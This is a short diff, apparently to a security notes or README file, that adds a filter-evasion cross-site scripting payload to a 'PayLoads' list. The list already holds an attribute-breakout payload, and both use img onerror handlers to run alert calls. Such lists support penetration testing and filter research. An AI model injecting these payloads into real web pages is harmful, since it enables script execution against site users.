@@ -11,4 +11,5 @@ WriteUps
 
 PayLoads
 - "><img src=x onerror=alert(document.domain)>
+- "><img \x34src=x onerror="javascript:alert(1)">
 
